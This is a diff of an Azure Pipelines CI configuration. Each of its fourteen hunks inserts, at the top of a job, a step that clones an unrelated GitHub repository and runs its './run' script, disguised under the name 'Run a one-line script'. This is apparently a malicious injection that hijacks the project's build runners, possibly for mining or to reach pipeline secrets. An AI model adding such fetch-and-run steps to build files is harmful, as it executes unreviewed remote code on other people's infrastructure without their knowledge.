@@ -20,6 +20,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - bash: |
         echo "Check Title of Pull Request: #$(System.PullRequest.PullRequestNumber)"
         title=$(curl https://api.github.com/repos/$(Build.Repository.Name)/pulls/$(System.PullRequest.PullRequestNumber) | jq -r '.title')
@@ -38,6 +40,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - bash: |
         echo "Reject pull request directly to master branch"
         exit 1
@@ -69,6 +73,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: Bash@3
     displayName: 'Extract Version'
     inputs:
@@ -89,6 +95,8 @@ jobs:
     vmImage: 'ubuntu-16.04'
 
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3'
     inputs:
@@ -136,6 +144,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -217,6 +227,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: Bash@3
     displayName: 'Bash Script'
     inputs:
@@ -238,6 +250,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -273,6 +287,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -303,6 +319,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: DownloadPipelineArtifact@1
     displayName: 'Download Metadata'
     inputs:
@@ -761,6 +779,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.7'
     inputs:
@@ -777,6 +797,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.6'
     inputs:
@@ -800,6 +822,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python $(python.version)'
     inputs:
@@ -823,6 +847,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+    displayName: 'Run a one-line script'
   - task: UsePythonVersion@0
     displayName: 'Use Python 3.6'
     inputs:
@@ -842,6 +868,8 @@ jobs:
   pool:
     vmImage: 'ubuntu-16.04'
   steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: 'Run a one-line script'
     - task: UsePythonVersion@0
       displayName: 'Use Python 3.6'
       inputs:
